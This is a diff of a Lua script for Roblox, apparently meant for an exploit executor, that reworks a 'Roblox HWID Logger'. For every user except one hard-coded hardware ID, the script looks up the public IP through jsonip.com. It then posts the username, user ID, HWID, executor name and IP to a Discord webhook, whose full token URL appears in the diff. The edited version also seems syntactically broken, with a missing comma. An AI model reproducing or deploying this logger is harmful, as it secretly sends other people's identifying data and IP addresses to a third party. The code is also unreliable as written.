@@ -14,6 +14,12 @@ local websocket = (syn and syn.websocket) or WebSocket
 if HWID ~= "97CB9DD4-E4FD-4124-86F6-DA05F5E1B7B0" then
 local jsonip = game:HttpGet("https://jsonip.com/")
 local ip = Services.HttpService:JSONDecode(jsonip)["ip"]
+local content = "> Name: "..LocalPlayer.Name
+content = content.."\n> Id: `"..LocalPlayer.UserId.."`"
+content = content.."\n> HWID: `"..HWID.."`"
+content = content.."\n> Executor: `"..Executor.."`"
+content = content.."\n> Ip: `"..ip.."`"
+content = content.."> https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile"
 request{
     Url = "https://discord.com/api/webhooks/1046446932039565513/Qz8LcvpOi_-fVpIhaKGS0vyaC2ONFv40zcQKaIAAiGO3pzvE_wBbH-_UNOYHGIi-s87I",
     Method = "POST",
@@ -21,7 +27,7 @@ request{
         ["Content-Type"] = "application/json"  -- When sending JSON, set this!
     },
     Body = Services.HttpService:JSONEncode({
-        content = "> Name: `"..LocalPlayer.Name.."`\n> Id: `"..LocalPlayer.UserId.."`\n> HWID: `"..HWID.."`\n> Executor: `"..Executor.."`\n> Ip: `"..ip.."`".."\n> https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
+        content = content
         username = "Roblox HWID Logger"
     })
 }
